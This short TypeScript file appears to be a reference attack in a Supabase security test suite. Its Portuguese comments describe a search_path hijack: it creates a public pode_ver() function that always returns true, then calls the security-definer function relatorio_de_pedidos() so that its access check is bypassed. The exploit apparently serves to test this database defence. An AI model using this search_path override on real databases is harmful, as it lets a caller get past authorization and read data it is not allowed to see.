import { definirAtaque } from '../../cliente/supabase'

// Ataque de referência: a função roda como o dono dela, mas procura pode_ver() no
// search_path de quem chama. Uma função de mesmo nome em public, que vem antes, toma o lugar.
export default definirAtaque(async (_supabase, _responder, sql) => {
  await sql("create function public.pode_ver(uuid) returns boolean language sql as 'select true'")
  await sql('select * from relatorio_de_pedidos()')
})
